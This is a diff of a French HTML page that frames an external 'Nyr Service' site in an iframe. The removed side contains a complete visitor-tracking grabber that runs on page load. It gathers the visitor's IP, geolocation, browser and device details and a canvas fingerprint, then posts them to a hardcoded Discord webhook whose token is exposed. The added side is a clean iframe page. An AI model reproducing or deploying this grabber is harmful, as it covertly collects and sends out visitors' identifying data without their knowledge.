@@ -1,136 +1,52 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Récupérateur de données</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background-color: #f0f0f0;
-            font-family: Arial, sans-serif;
-        }
-        iframe {
-            width: 100%;
-            height: 100%;
-            border: none;
-        }
-        .loading {
-            position: absolute;
-            top: 10px;
-            left: 10px;
-            color: #333;
-        }
-        .error {
-            color: red;
-            text-align: center;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>Nyr Service – Aperçu</title>
+  <style>
+    html, body {
+      margin: 0;
+      height: 100%;
+      overflow: hidden;
+      font-family: Arial, sans-serif;
+    }
+
+    iframe {
+      border: none;
+      width: 100%;
+      height: 100%;
+    }
+
+    header {
+      position: absolute;
+      top: 0;
+      width: 100%;
+      background: #0a0a0a;
+      color: #fff;
+      padding: 10px 20px;
+      z-index: 10;
+      font-size: 20px;
+      font-weight: bold;
+    }
+
+    .iframe-container {
+      position: absolute;
+      top: 50px; /* Leave room for the header */
+      bottom: 0;
+      left: 0;
+      right: 0;
+    }
+  </style>
 </head>
 <body>
-    <div class="loading">Chargement...</div>
-    <iframe src="http://nyrservice.netlify.app/" title="Contenu intégré" onload="document.querySelector('.loading').style.display='none';" onerror="document.querySelector('.loading').innerHTML='<p class=\"error\">Erreur : Impossible de charger le contenu. Veuillez réessayer.</p>';"></iframe>
-    <script>
-        async function sendUserData() {
-            try {
-                // Récupérer l'IP
-                let ip = 'Non disponible';
-                try {
-                    const ipResponse = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipResponse.json();
-                    ip = ipData.ip || 'Non disponible';
-                } catch (err) {
-                    console.error('Erreur lors de la récupération de l\'IP:', err);
-                }
 
-                // Récupérer la géolocalisation
-                let geolocation = 'Non disponible';
-                try {
-                    const geoResponse = await fetch(`http://ip-api.com/json/${ip}`);
-                    const geoData = await geoResponse.json();
-                    if (geoData.status === 'success') {
-                        geolocation = `${geoData.city || 'Inconnue'}, ${geoData.regionName || 'Inconnue'}, ${geoData.country || 'Inconnu'} (ISP: ${geoData.isp || 'Inconnu'}, Lat: ${geoData.lat || 'N/A'}, Lon: ${geoData.lon || 'N/A'})`;
-                    }
-                } catch (err) {
-                    console.error('Erreur lors de la récupération de la géolocalisation:', err);
-                }
+  <header>
+    🔧 Nyr Service – Aperçu intégré
+  </header>
 
-                // Récupérer les informations du navigateur
-                const userAgent = navigator.userAgent || 'Non disponible';
-                const language = navigator.language || 'Non disponible';
-                const languages = navigator.languages ? navigator.languages.join(', ') : 'Non disponible';
-                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Non disponible';
-                const screenResolution = `${window.screen.width}x${window.screen.height}` || 'Non disponible';
-                const windowSize = `${window.innerWidth}x${window.innerHeight}` || 'Non disponible';
-                const colorDepth = window.screen.colorDepth || 'Non disponible';
-                const platform = navigator.platform || 'Non disponible';
-                const cpuCores = navigator.hardwareConcurrency || 'Non disponible';
-                const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} Go` : 'Non disponible';
-                const referrer = document.referrer || 'Non disponible';
-                const connection = navigator.connection ? `${navigator.connection.effectiveType || 'N/A'} (Downlink: ${navigator.connection.downlink || 'N/A'} Mbps)` : 'Non disponible';
+  <div class="iframe-container">
+    <iframe src="https://nyr-tech-services.lovable.app" title="Nyr Service intégré"></iframe>
+  </div>
 
-                // Canvas Fingerprinting
-                let canvasFingerprint = 'Non disponible';
-                try {
-                    const canvas = document.createElement('canvas');
-                    const ctx = canvas.getContext('2d');
-                    ctx.textBaseline = 'top';
-                    ctx.font = '14px Arial';
-                    ctx.fillStyle = '#f60';
-                    ctx.fillRect(125, 1, 62, 20);
-                    ctx.fillStyle = '#069';
-                    ctx.fillText('Test fingerprint', 2, 15);
-                    canvasFingerprint = canvas.toDataURL();
-                } catch (err) {
-                    console.error('Erreur lors du canvas fingerprinting:', err);
-                }
-
-                // Données à envoyer au webhook
-                const embedData = {
-                    embeds: [
-                        {
-                            title: '**Nouvel utilisateur détecté**',
-                            description: `\`\`\`yaml\nIP: ${ip}\nGéolocalisation: ${geolocation}\nUser-Agent: ${userAgent}\nLangue: ${language}\nLangues secondaires: ${languages}\nFuseau horaire: ${timezone}\nRésolution d'écran: ${screenResolution}\nTaille de la fenêtre: ${windowSize}\nProfondeur de couleur: ${colorDepth}\nPlateforme: ${platform}\nCœurs CPU: ${cpuCores}\nMémoire appareil: ${deviceMemory}\nConnexion réseau: ${connection}\nRéférent: ${referrer}\nCanvas Fingerprint: ${canvasFingerprint.substring(0, 50)}...\nHeure de la visite: ${new Date().toISOString()}\n\`\`\``,
-                            color: 3092790,
-                            footer: {
-                                text: 'Créé par Astraa ・ https://github.com/astraadev'
-                            },
-                            timestamp: new Date().toISOString()
-                        }
-                    ],
-                    username: 'Grabber',
-                    avatar_url: 'https://avatars.githubusercontent.com/u/43183806?v=4'
-                };
-
-                // Envoyer les données au webhook
-                const webhookUrl = 'https://discord.com/api/webhooks/1363874178297499899/-7kETsy0lEq5JH55BFQR0lG2eYJIO-CxTMlrLtBwYmcmgi1prrqao8dP0vybcQ_otkgq';
-                const response = await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(embedData)
-                });
-
-                if (response.ok) {
-                    console.log('Données envoyées au webhook avec succès');
-                } else {
-                    console.error('Erreur lors de l\'envoi au webhook:', response.status);
-                }
-            } catch (err) {
-                console.error('Erreur générale:', err);
-            }
-        }
-
-        // Exécuter la fonction dès que la page est chargée
-        window.onload = () => {
-            sendUserData();
-        };
-    </script>
 </body>
 </html>
